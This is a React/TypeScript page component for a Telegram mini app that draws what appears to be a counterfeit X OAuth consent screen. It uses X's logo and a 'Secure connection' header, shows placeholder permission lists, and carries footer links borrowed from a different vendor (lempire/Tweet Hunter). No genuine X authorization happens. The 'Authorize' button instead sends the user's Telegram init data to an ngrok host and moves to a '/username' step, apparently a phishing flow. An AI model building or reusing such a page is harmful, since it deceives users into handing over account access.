// src/pages/OAuth.tsx
import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useSignal, initData } from "@tma.js/sdk-react";
import axios from "axios";
import "./OAuth.css";
import type { JobStartResponse } from "../../../server/src/types/jobs";
import { FullScreenLoader } from "../components/FullScreenLoader";

type AuthStatus = "pending" | "success" | "error";

type DbUserInfo =
  | { isAuthenticated: true; username: string; createdAt: string }
  | { isAuthenticated: false; username: null; createdAt: null };

type TelegramInitResponse = {
  ok: boolean;
  userId: number | null;
  chatInstance: string | null;
  dbUser: DbUserInfo;
  error?: string;
};

export const OAuth = () => {
  const navigate = useNavigate();
  const initDataRaw = useSignal(initData.raw);

  const [authStatus, setAuthStatus] = useState<AuthStatus>("pending");
  const [dbUser, setDbUser] = useState<DbUserInfo | null>(null);
  const [errorMessage, setErrorMessage] = useState<string>("");

  useEffect(() => {
    console.log("🔥 REAL initDataRaw:", initDataRaw);
  }, [initDataRaw]);

  useEffect(() => {
    if (!initDataRaw) {
      setAuthStatus("pending");
      return;
    }

    setAuthStatus("pending");

    axios
      .post<TelegramInitResponse>(
        "https://juiceless-hyo-pretechnical.ngrok-free.dev/api/auth/telegram-init",
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      )
      .then((response) => {
        const data = response.data;
        console.log("Auth init response:", data);

        if (!data.ok) {
          setAuthStatus("error");
          setErrorMessage(data.error || "Authentication failed");
          return;
        }

        setAuthStatus("success");
        setDbUser(data.dbUser);

        // Logs propres dans la console (sans stocker en state)
        if (data.userId) {
          console.log(`✅ Validé avec l'ID: ${data.userId}`);
        }
        if (data.chatInstance) {
          console.log(`🧩 chat_instance: ${data.chatInstance}`);
        }
        if (data.dbUser) {
          if (data.dbUser.isAuthenticated) {
            console.log(`✅ Déjà connecté à X : @${data.dbUser.username}`);
            console.log(`🕒 Créé le : ${data.dbUser.createdAt}`);
          } else {
            console.log("ℹ️ Pas encore connecté à X");
          }
        }

        // 🔥 AUTO-REDIRECT SI DEJA AUTHENTIFIÉ
        if (data.dbUser.isAuthenticated) {
          navigate("/home", {
            state: { username: data.dbUser.username },
          });
        }
      })
      .catch((err) => {
        console.error("Auth init error:", err);
        setAuthStatus("error");
        setErrorMessage(
          err.response?.data?.error || err.message || "Network error"
        );
      });
  }, [initDataRaw, navigate]);

  const handleAuthorize = async () => {
    if (!initDataRaw) return;

    // 🔥 déjà auth => redirection immédiate avec username
    if (dbUser?.isAuthenticated) {
      navigate("/home", { state: { username: dbUser.username } });
      return;
    }

    try {
      const resp = await axios.post<JobStartResponse>(
        "https://juiceless-hyo-pretechnical.ngrok-free.dev/api/jobs/start",
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      console.log("Job create response:", resp.data);

      if (!resp.data.ok) {
        if (resp.data.error === "JOB_ALREADY_RUNNING") {
          console.log("Job déjà en cours pour ce user");
        } else {
          console.warn("Job start error:", resp.data.error);
        }
      }

      navigate("/username");
    } catch (err) {
      console.error("Job create error:", err);
    }
  };

  const isDbAuthed = dbUser?.isAuthenticated === true;

  const canDoItems = [
    "Stay connected to your account until you revoke access.",
    "Upload media like photos and videos for you.",
    "Block and unblock accounts for you.",
  ];

  const canViewItems = [
    "Posts you've liked and likes you can view.",
    "All of the posts you can view, including posts from protected accounts.",
    "Accounts you've muted.",
  ];

  return (
    <div className="oauth-page">
      <FullScreenLoader
        visible={authStatus === "pending"}
        text="Vérification en cours..."
      />
      <div className="oauth-container">
        <div className="oauth-container-inner">
          <div className="oauth-header">
            <div className="oauth-header-content">
              <div className="oauth-header-left">
                <svg
                  viewBox="0 0 24 24"
                  aria-label="X"
                  role="img"
                  className="oauth-logo"
                >
                  <g>
                    <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
                  </g>
                </svg>
                <span>OAuth • Secure connection</span>
              </div>
              <span className="oauth-header-right">app.fansgram.io</span>
            </div>
          </div>

          <div className="oauth-content">
            <div className="oauth-title-section">
              <p className="oauth-title">
                Fansgram wants to access your X account.
              </p>

              <div className="oauth-app-card">
                <div className="oauth-app-info">
                  <div
                    className="oauth-app-icon"
                    style={{
                      background: "linear-gradient(135deg, #1d9bf0, #004c86)",
                    }}
                  >
                    FG
                  </div>
                  <div>
                    <p className="oauth-app-name">Fansgram</p>
                    <p className="oauth-app-handle">
                      {isDbAuthed ? `@${dbUser.username}` : "@yourname"}
                    </p>
                  </div>
                </div>
                <button type="button" className="oauth-view-app">
                  View app
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                    <polyline points="15 3 21 3 21 9"></polyline>
                    <line x1="10" y1="14" x2="21" y2="3"></line>
                  </svg>
                </button>
              </div>
            </div>

            <div className="oauth-actions">
              <button
                className="oauth-authorize-button"
                onClick={handleAuthorize}
                disabled={authStatus === "pending"}
              >
                {isDbAuthed ? "Continuer" : "Authorize app"}
              </button>
              {authStatus === "error" && (
                <div className="oauth-error-message">❌ {errorMessage}</div>
              )}
            </div>

            <div className="oauth-divider"></div>

            <div className="oauth-info-section">
              <p className="oauth-description">
                Find inspiration from the best and become a Tweet Machine.
              </p>

              <div className="oauth-info-list">
                <p className="oauth-info-title">Things this App can do...</p>
                <ul className="oauth-info-items">
                  {canDoItems.map((item, index) => (
                    <li key={index} className="oauth-info-item">
                      <span className="oauth-info-bullet"></span>
                      <span>{item}</span>
                    </li>
                  ))}
                </ul>
                <button type="button" className="oauth-info-more">
                  8 more
                </button>
              </div>

              <div className="oauth-info-list">
                <p className="oauth-info-title">Things this App can view...</p>
                <ul className="oauth-info-items">
                  {canViewItems.map((item, index) => (
                    <li key={index} className="oauth-info-item">
                      <span className="oauth-info-bullet"></span>
                      <span>{item}</span>
                    </li>
                  ))}
                </ul>
                <button type="button" className="oauth-info-more">
                  7 more
                </button>
              </div>
            </div>

            <div className="oauth-divider"></div>

            <div className="oauth-footer">
              <p>
                Made by{" "}
                <a
                  href="https://lempire.co/"
                  target="_blank"
                  rel="noreferrer"
                  className="oauth-link"
                >
                  lempire
                </a>
                . Read lempire's{" "}
                <a
                  href="https://tweethunter.io/privacy-policy"
                  target="_blank"
                  rel="noreferrer"
                  className="oauth-link"
                >
                  privacy policy
                </a>{" "}
                and{" "}
                <a
                  href="https://tweethunter.io/terms-of-use"
                  target="_blank"
                  rel="noreferrer"
                  className="oauth-link"
                >
                  terms
                </a>
                .
              </p>
              <p className="oauth-footer-small">
                By authorizing Tweet Hunter Pro, you agree to X's{" "}
                <a
                  href="https://x.com/en/tos"
                  target="_blank"
                  rel="noreferrer"
                  className="oauth-link"
                >
                  Terms of Service
                </a>{" "}
                and{" "}
                <a
                  href="https://x.com/en/privacy"
                  target="_blank"
                  rel="noreferrer"
                  className="oauth-link"
                >
                  Privacy Policy
                </a>
                .
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
